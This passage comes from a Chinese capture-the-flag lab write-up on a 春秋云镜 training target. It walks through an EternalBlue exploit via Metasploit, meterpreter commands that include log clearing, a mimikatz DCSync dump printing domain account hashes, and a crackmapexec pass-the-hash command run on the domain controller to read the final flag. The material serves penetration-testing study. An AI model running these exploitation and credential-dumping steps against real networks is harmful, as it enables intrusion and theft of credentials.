的扫描中我们发现该机子存在 MS17-010 漏洞，这个就是大名鼎鼎的永恒之蓝漏洞<br>我们先在 kali 输入<code>msfconsole</code>启动<code>Metasploit Framework</code>（后面简称 msf）</p><p>输入<code>search ms17-010</code>搜索<code>ms17-010</code>相关模块，可以看到一共找到了 4 个不同的模块</p><div class="highlight-wrap" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[/etc]</span><br><span class="line">└─$ msfconsole</span><br><span class="line">Metasploit tip: Writing a custom module? After editing your module, why not try </span><br><span class="line">the reload <span class="built_in">command</span></span><br><span class="line">                                                  </span><br><span class="line"></span><br><span class="line">      .:okOOOkdc<span class="string">&#x27;           &#x27;</span>cdkOOOko:.                                                              </span><br><span class="line">    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.                                                            </span><br><span class="line">   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:                                                           </span><br><span class="line">  <span class="string">&#x27;OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO&#x27;</span>                                                          </span><br><span class="line">  oOOOOOOOO.    .oOOOOoOOOOl.    ,OOOOOOOOo                                                          </span><br><span class="line">  dOOOOOOOO.      .cOOOOOc.      ,OOOOOOOOx                                                          </span><br><span class="line">  lOOOOOOOO.         ;d;         ,OOOOOOOOl                                                          </span><br><span class="line">  .OOOOOOOO.   .;           ;    ,OOOOOOOO.                                                          </span><br><span class="line">   cOOOOOOO.   .OOc.     <span class="string">&#x27;oOO.   ,OOOOOOOc                                                           </span></span><br><span class="line"><span class="string">    oOOOOOO.   .OOOO.   :OOOO.   ,OOOOOOo                                                            </span></span><br><span class="line"><span class="string">     lOOOOO.   .OOOO.   :OOOO.   ,OOOOOl                                                             </span></span><br><span class="line"><span class="string">      ;OOOO&#x27;</span>   .OOOO.   :OOOO.   ;OOOO;                                                              </span><br><span class="line">       .dOOo   .OOOOocccxOOOO.   xOOd.                                                               </span><br><span class="line">         ,kOl  .OOOOOOOOOOOOO. .dOk,                                                                 </span><br><span class="line">           :kk;.OOOOOOOOOOOOO.cOk:                                                                   </span><br><span class="line">             ;kOOOOOOOOOOOOOOOk:                                                                     </span><br><span class="line">               ,xOOOOOOOOOOOx,                                                                       </span><br><span class="line">                 .lOOOOOOOl.                                                                         </span><br><span class="line">                    ,dOd,                                                                            </span><br><span class="line">                      .                                                                              </span><br><span class="line"></span><br><span class="line">       =[ metasploit v6.4.9-dev                           ]</span><br><span class="line">+ -- --=[ 2420 exploits - 1248 auxiliary - 423 post       ]</span><br><span class="line">+ -- --=[ 1465 payloads - 47 encoders - 11 nops           ]</span><br><span class="line">+ -- --=[ 9 evasion                                       ]</span><br><span class="line"></span><br><span class="line">Metasploit Documentation: https://docs.metasploit.com/</span><br><span class="line"></span><br><span class="line">msf6 &gt; search ms17-010</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   <span class="comment">#   Name                                           Disclosure Date  Rank     Check  Description</span></span><br><span class="line">   -   ----                                           ---------------  ----     -----  -----------</span><br><span class="line">   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption</span><br><span class="line">   1     \_ target: Automatic Target                  .                .        .      .</span><br><span class="line">   2     \_ target: Windows 7                         .                .        .      .</span><br><span class="line">   3     \_ target: Windows Embedded Standard 7       .                .        .      .</span><br><span class="line">   4     \_ target: Windows Server 2008 R2            .                .        .      .</span><br><span class="line">   5     \_ target: Windows 8                         .                .        .      .</span><br><span class="line">   6     \_ target: Windows 8.1                       .                .        .      .</span><br><span class="line">   7     \_ target: Windows Server 2012               .                .        .      .</span><br><span class="line">   8     \_ target: Windows 10 Pro                    .                .        .      .</span><br><span class="line">   9     \_ target: Windows 10 Enterprise Evaluation  .                .        .      .</span><br><span class="line">   10  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution</span><br><span class="line">   11    \_ target: Automatic                         .                .        .      .</span><br><span class="line">   12    \_ target: PowerShell                        .                .        .      .</span><br><span class="line">   13    \_ target: Native upload                     .                .        .      .</span><br><span class="line">   14    \_ target: MOF upload                        .                .        .      .</span><br><span class="line">   15    \_ AKA: ETERNALSYNERGY                       .                .        .      .</span><br><span class="line">   16    \_ AKA: ETERNALROMANCE                       .                .        .      .</span><br><span class="line">   17    \_ AKA: ETERNALCHAMPION                      .                .        .      .</span><br><span class="line">   18    \_ AKA: ETERNALBLUE                          .                .        .      .</span><br><span class="line">   19  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution</span><br><span class="line">   20    \_ AKA: ETERNALSYNERGY                       .                .        .      .</span><br><span class="line">   21    \_ AKA: ETERNALROMANCE                       .                .        .      .</span><br><span class="line">   22    \_ AKA: ETERNALCHAMPION                      .                .        .      .</span><br><span class="line">   23    \_ AKA: ETERNALBLUE                          .                .        .      .</span><br><span class="line">   24  auxiliary/scanner/smb/smb_ms17_010             .                normal   No     MS17-010 SMB RCE Detection</span><br><span class="line">   25    \_ AKA: DOUBLEPULSAR                         .                .        .      .</span><br><span class="line">   26    \_ AKA: ETERNALBLUE                          .                .        .      .</span><br><span class="line">   27  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution</span><br><span class="line">   28    \_ target: Execute payload (x64)             .                .        .      .</span><br><span class="line">   29    \_ target: Neutralize implant                .                .        .      .</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interact with a module by name or index. For example info 29, use 29 or use exploit/windows/smb/smb_doublepulsar_rce                                                                                      </span><br><span class="line">After interacting with a module you can manually <span class="built_in">set</span> a TARGET with <span class="built_in">set</span> TARGET <span class="string">&#x27;Neutralize implant&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p>这里我们选择使用第一个模块，因为他影响是版本比较多，然后接下来依次输入以下命令来发起永恒之蓝攻击：</p><div class="highlight-wrap" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue  <span class="comment"># 选择使用的模块</span></span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/bind_tcp_uuid  <span class="comment"># 设置payload，可以通过show payloads查看</span></span><br><span class="line"><span class="built_in">set</span> RHOSTS 172.22.1.21  <span class="comment"># 设置靶机的ip</span></span><br><span class="line">exploit  <span class="comment"># 发起攻击</span></span><br></pre></td></tr></table></figure></div><p>运行成功会出现<code>meterpreter&gt;</code><br>该<code>Meterpreter</code>是<code>metasploit</code>的一个扩展模块，可以调用<code>metasploit</code>的一些功能，对目标系统进行更深入的渗透，入获取屏幕、上传&#x2F;下载文件、创建持久后门等</p><div class="highlight-wrap" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 介绍一些该模块常用的命令</span></span><br><span class="line">meterpreter &gt; screenshot <span class="comment"># 捕获屏幕</span></span><br><span class="line">meterpreter &gt; upload hello.txt c:// <span class="comment">#上传文件</span></span><br><span class="line">meterpreter &gt; download d://1.txt <span class="comment"># 下载文件</span></span><br><span class="line">meterpreter &gt; shell <span class="comment"># 获取cmd</span></span><br><span class="line">meterpreter &gt; clearev <span class="comment"># 清除日志</span></span><br></pre></td></tr></table></figure></div><p>紧接着上图，可以发现我们已经成功的打进该主机，遗憾的是该机子上并没有 flag ，也就是说我们最后的flag 在 windows DC 域控制器上面<br>接下来是进行 DCSync 攻击，这里简单解释一下：<br>首先，什么是 DCSync</p><blockquote><p>在域中，不同的域控之间，默认每隔15min就会进行一次域数据同步。当一个额外的域控想从其他域控同步数据时，额外域控会像其他域控发起请求，请求同步数据。如果需要同步的数据比较多，则会重复上述过程。DCSync就是利用这个原理，通过目录复制服务（Directory Replication Service，DRS）的GetNCChanges接口像域控发起数据同步请求，以获得指定域控上的活动目录数据。目录复制服务也是一种用于在活动目录中复制和管理数据的RPC协议。该协议由两个RPC接口组成。分别是drsuapi和dsaop。<br>DCSync是mimikatz在2015年添加的一个功能，由Benjamin DELPY gentilkiwi和Vincent LE TOUX共同编写，能够用来导出域内所有用户的hash</p></blockquote><p>也就是说我们可以通过<code>DCSync</code>来导出所有用户的 hash 然后进行哈希传递攻击，要想使用 DCSync 必须获得以下任一用户的权限</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Administrators 组内的用户</span><br><span class="line">Domain Admins 组内的用户</span><br><span class="line">Enterprise Admins 组内的用户域控制器的计算机帐户</span><br></pre></td></tr></table></figure></div><p>现在我们回看一开始<code>fscan</code>的扫描结果</p><div class="highlight-wrap" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[+] MS17-010 172.22.1.21    (Windows Server 2008 R2 Enterprise 7601 Service Pack 1)</span><br></pre></td></tr></table></figure></div><p>我们可以看到我们用永恒之蓝打下的这台机子是 enterprise 用户，也就是说满足 DCSync 攻击的条件，于是我们在 msf 中依次输入以下命令来获取用户的 hash</p><div class="highlight-wrap" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">load kiwi  <span class="comment"># 调用mimikatz模块</span></span><br><span class="line">kiwi_cmd <span class="string">&quot;lsadump::dcsync /domain:xiaorang.lab /all /csv&quot;</span> <span class="built_in">exit</span>  <span class="comment"># 导出域内所有用户的信息(包括哈希值)</span></span><br></pre></td></tr></table></figure></div><p>下面是执行的全过程</p><div class="highlight-wrap" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; Interrupt: use the <span class="string">&#x27;exit&#x27;</span> <span class="built_in">command</span> to quit</span><br><span class="line">msf6 &gt; use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; <span class="built_in">set</span> payload windows/x64/meterpreter/bind_tcp_uuid</span><br><span class="line">payload =&gt; windows/x64/meterpreter/bind_tcp_uuid</span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; <span class="built_in">set</span> RHOSTS 172.22.1.21</span><br><span class="line">RHOSTS =&gt; 172.22.1.21</span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] 172.22.1.21:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check</span><br><span class="line">[+] 172.22.1.21:445       - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 R2 Enterprise 7601 Service Pack 1 x64 (64-bit)</span><br><span class="line">[*] 172.22.1.21:445       - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[+] 172.22.1.21:445 - The target is vulnerable.</span><br><span class="line">[*] 172.22.1.21:445 - Connecting to target <span class="keyword">for</span> exploitation.</span><br><span class="line">[+] 172.22.1.21:445 - Connection established <span class="keyword">for</span> exploitation.</span><br><span class="line">[+] 172.22.1.21:445 - Target OS selected valid <span class="keyword">for</span> OS indicated by SMB reply</span><br><span class="line">[*] 172.22.1.21:445 - CORE raw buffer dump (53 bytes)</span><br><span class="line">[*] 172.22.1.21:445 - 0x00000000  57 69 6e 64 6f 77 73 20 53 65 72 76 65 72 20 32  Windows Server 2</span><br><span class="line">[*] 172.22.1.21:445 - 0x00000010  30 30 38 20 52 32 20 45 6e 74 65 72 70 72 69 73  008 R2 Enterpris</span><br><span class="line">[*] 172.22.1.21:445 - 0x00000020  65 20 37 36 30 31 20 53 65 72 76 69 63 65 20 50  e 7601 Service P</span><br><span class="line">[*] 172.22.1.21:445 - 0x00000030  61 63 6b 20 31                                   ack 1           </span><br><span class="line">[+] 172.22.1.21:445 - Target <span class="built_in">arch</span> selected valid <span class="keyword">for</span> <span class="built_in">arch</span> indicated by DCE/RPC reply</span><br><span class="line">[*] 172.22.1.21:445 - Trying exploit with 12 Groom Allocations.</span><br><span class="line">[*] 172.22.1.21:445 - Sending all but last fragment of exploit packet</span><br><span class="line">[*] 172.22.1.21:445 - Starting non-paged pool grooming</span><br><span class="line">[+] 172.22.1.21:445 - Sending SMBv2 buffers</span><br><span class="line">[+] 172.22.1.21:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.</span><br><span class="line">[*] 172.22.1.21:445 - Sending final SMBv2 buffers.</span><br><span class="line">[*] 172.22.1.21:445 - Sending last fragment of exploit packet!</span><br><span class="line">[*] 172.22.1.21:445 - Receiving response from exploit packet</span><br><span class="line">[+] 172.22.1.21:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!</span><br><span class="line">[*] 172.22.1.21:445 - Sending egg to corrupted connection.</span><br><span class="line">[*] 172.22.1.21:445 - Triggering free of corrupted buffer.</span><br><span class="line">[*] Started <span class="built_in">bind</span> TCP handler against 172.22.1.21:4444</span><br><span class="line">[*] Sending stage (201798 bytes) to 172.22.1.21</span><br><span class="line">[*] Meterpreter session 1 opened (10.0.2.15:36153 -&gt; 172.22.1.21:4444) at 2024-09-21 23:38:50 -0400</span><br><span class="line">[+] 172.22.1.21:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">[+] 172.22.1.21:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">[+] 172.22.1.21:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line"></span><br><span class="line">meterpreter &gt; load kiwi</span><br><span class="line">Loading extension kiwi...</span><br><span class="line">  .#####.   mimikatz 2.2.0 20191125 (x64/windows)</span><br><span class="line"> .## ^ <span class="comment">##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span></span><br><span class="line"> <span class="comment">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span></span><br><span class="line"> <span class="comment">## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz</span></span><br><span class="line"> <span class="string">&#x27;## v ##&#x27;</span>        Vincent LE TOUX            ( vincent.letoux@gmail.com )</span><br><span class="line">  <span class="string">&#x27;#####&#x27;</span>         &gt; http://pingcastle.com / http://mysmartlogon.com  ***/</span><br><span class="line"></span><br><span class="line">Success.</span><br><span class="line">meterpreter &gt; kiwi_cmd <span class="string">&quot;lsadump::dcsync /domain:xiaorang.lab /all /csv&quot;</span> <span class="built_in">exit</span></span><br><span class="line">[DC] <span class="string">&#x27;xiaorang.lab&#x27;</span> will be the domain</span><br><span class="line">[DC] <span class="string">&#x27;DC01.xiaorang.lab&#x27;</span> will be the DC server</span><br><span class="line">[DC] Exporting domain <span class="string">&#x27;xiaorang.lab&#x27;</span></span><br><span class="line">[rpc] Service  : ldap</span><br><span class="line">[rpc] AuthnSvc : GSS_NEGOTIATE (9)</span><br><span class="line">502     krbtgt  fb812eea13a18b7fcdb8e6d67ddc205b        514</span><br><span class="line">1106    Marcus  e07510a4284b3c97c8e7dee970918c5c        512</span><br><span class="line">1107    Charles f6a9881cd5ae709abb4ac9ab87f24617        512</span><br><span class="line">1000    DC01$   41934ce1b8888fd75b8179e3535a983a        532480</span><br><span class="line">500     Administrator   10cf89a850fb1cdbe6bb432b859164c8        512</span><br><span class="line">1104    XIAORANG-OA01$  bd227c7ddbf221ea74dea7834815adc5        4096</span><br><span class="line">1108    XIAORANG-WIN7$  22d4977c16a5cc2277246a4ce6400bab        4096</span><br><span class="line"></span><br><span class="line">mimikatz(powershell) <span class="comment"># exit</span></span><br><span class="line">Bye!</span><br><span class="line"></span><br><span class="line">meterpreter &gt; </span><br></pre></td></tr></table></figure></div><p>这里我们比较关注是<code>Administrator</code>用户的 hash，接下来我们使用<code>crackmapexec</code>来进行哈希传递攻击，来实现 DC域控 上的任意命令执行，通过以下命令来获取 flag3</p><div class="highlight-wrap" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x <span class="string">&quot;type Users\Administrator\flag\flag03.txt&quot;</span></span><br><span class="line"></span><br><span class="line">[*] First <span class="keyword">time</span> use detected</span><br><span class="line">[*] Creating home directory structure</span><br><span class="line">[*] Creating default workspace</span><br><span class="line">[*] Initializing RDP protocol database</span><br><span class="line">[*] Initializing SSH protocol database</span><br><span class="line">[*] Initializing LDAP protocol database</span><br><span class="line">[*] Initializing FTP protocol database</span><br><span class="line">[*] Initializing WINRM protocol database</span><br><span class="line">[*] Initializing SMB protocol database</span><br><span class="line">[*] Initializing MSSQL protocol database</span><br><span class="line">[*] Copying default configuration file</span><br><span class="line">[*] Generating SSL certificate</span><br><span class="line">SMB         172.22.1.2      445    DC01             [*] Windows Server 2016 Datacenter 14393 x64 (name:DC01) (domain:xiaorang.lab) (signing:True) (SMBv1:True)</span><br><span class="line">SMB         172.22.1.2      445    DC01             [+] xiaorang.lab\administrator:10cf89a850fb1cdbe6bb432b859164c8 (Pwn3d!)</span><br><span class="line">SMB         172.22.1.2      445    DC01             [+] Executed <span class="built_in">command</span> </span><br><span class="line">SMB         172.22.1.2      445    DC01             ___   ___</span><br><span class="line">SMB         172.22.1.2      445    DC01             \\ / /       / /    // | |     //   ) ) //   ) )  // | |     /|    / / //   ) )</span><br><span class="line">SMB         172.22.1.2      445    DC01             \  /       / /    //__| |    //   / / //___/ /  //__| |    //|   / / //</span><br><span class="line">SMB         172.22.1.2      445    DC01             / /       / /    / ___  |   //   / / / ___ (   / ___  |   // |  / / //  ____</span><br><span class="line">SMB         172.22.1.2      445    DC01             / /\\     / /    //    | |  //   / / //   | |  //    | |  //  | / / //    / /                                                                         </span><br><span class="line">SMB         172.22.1.2      445    DC01             / /  \\ __/ /___ //     | | ((___/ / //    | | //     | | //   |/ / ((____/ /                                                                         </span><br><span class="line">SMB         <span class="number">172.22</span>.<span class="number">1.2</span>      <span class="number">445</span>    DC01             </span><br><span class="line">SMB         <span class="number">172.22</span>.<span class="number">1.2</span>      <span class="number">445</span>    DC01             </span><br><span class="line">SMB         <span class="number">172.22</span>.<span class="number">1.2</span>      <span class="number">445</span>    DC01             flag03: e8f88d0d43d6&#125;</span><br><span class="line">SMB         <span class="number">172.22</span>.<span class="number">1.2</span>      <span class="number">445</span>    DC01             </span><br><span class="line">SMB         <span class="number">172.22</span>.<span class="number">1.2</span>      <span class="number">445</span>    DC01             Unbelievable! ! You found the last flag, which means you have full control over the entire domain network. </span><br></pre></td></tr></table></figure></div><p>最终flag就出了<br>flag{60b53231-2ce3-4813-87d4-e8f88d0d43d6}</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这次只是春秋云镜最简单的靶机，提前看了许多wp，下好了工具，熟悉了每一个流程才开始打的，但是还是花了将近两个小时的时间，不过收获是真的很大，以前不怎么理解的原理终于懂了一些</p><p>总的来说，是个不错的开始，继续奋斗！</p>]]></content>
      
      
      
        <tags>
            
            <tag> Penetration </tag>
            
            <tag> 春秋云境 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
